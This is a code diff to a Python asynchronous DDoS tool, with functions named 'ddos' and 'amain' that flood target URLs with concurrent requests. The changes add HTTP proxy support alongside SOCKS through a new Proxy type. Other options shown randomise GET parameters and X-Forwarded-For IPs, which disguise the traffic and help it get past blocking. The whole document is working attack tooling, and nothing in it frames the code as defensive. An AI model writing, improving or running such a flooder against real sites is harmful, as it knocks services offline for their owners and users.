@@ -21,27 +21,30 @@ import click
 import requests as requests
 from aiohttp_socks import ProxyConnector
 
-from commons import config_logger, set_limits, load_proxies
+from commons import config_logger, set_limits, load_proxies, Proxy
 
 STATS = defaultdict(int)
 URL_ERRORS_COUNT = defaultdict(int)
 URL_STATUS_STATS = defaultdict(lambda: defaultdict(int))
 
 
-async def make_request(url: str, proxy: str, timeout: int, headers: Dict[str, str], ignore_response: bool):
+async def make_request(url: str, proxy: Proxy, timeout: int, headers: Dict[str, str], ignore_response: bool):
     timeout = aiohttp.ClientTimeout(total=timeout)
     logging.debug('Url: %s Proxy: %s header: %s', url, proxy, headers)
     base_url = url.split('?', 1)[0]
     try:
-        if proxy:
-            connector = ProxyConnector.from_url(proxy)
+        request_kwargs = {}
+        if proxy and proxy.protocol in ('socks4', 'socks5'):
+            connector = ProxyConnector.from_url(proxy.get_formatted())
             client_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
         else:
+            if proxy:
+                request_kwargs['proxy'] = proxy.get_formatted()
             client_session = aiohttp.ClientSession(timeout=timeout)
         client_session.headers.update(headers)
 
         async with client_session as session:
-            async with session.get(url, ssl=False) as response:
+            async with session.get(url, ssl=False, **request_kwargs) as response:
                 URL_STATUS_STATS[base_url][response.status] += 1
                 if not ignore_response:
                     await response.text()
@@ -59,10 +62,9 @@ async def make_request(url: str, proxy: str, timeout: int, headers: Dict[str, st
         STATS['success'] += 1
 
 
-def get_proxy(proxy_iterator: Iterable[str]) -> str:
+def get_proxy(proxy_iterator: Iterable[Proxy]) -> str:
     try:
-        type_, ip, port = next(proxy_iterator)
-        return f'{type_}://{ip}:{port}'
+        return next(proxy_iterator)
     except StopIteration:
         return None
 
@@ -102,7 +104,7 @@ def split_target(target: str):
 
 
 async def ddos(
-        target: str, timeout: int, count: int, proxy_iterator: Iterable[Tuple[str, str, int]],
+        target: str, timeout: int, count: int, proxy_iterator: Iterable[Proxy],
         with_random_get_param: bool, user_agent: str, ignore_response: bool, random_xff_ip: bool, custom_headers: str,
         stop_attack: int
 ):
@@ -128,7 +130,7 @@ def log_stats():
 
 
 async def amain(
-        targets: List[str], timeout: int, concurrency: int, count: int, proxies: List[Tuple[str, str, int]],
+        targets: List[str], timeout: int, concurrency: int, count: int, proxies: List[Proxy],
         with_random_get_param: bool, user_agent: str, ignore_response: bool, random_xff_ip: bool, custom_headers: str,
         stop_attack: int
 ):
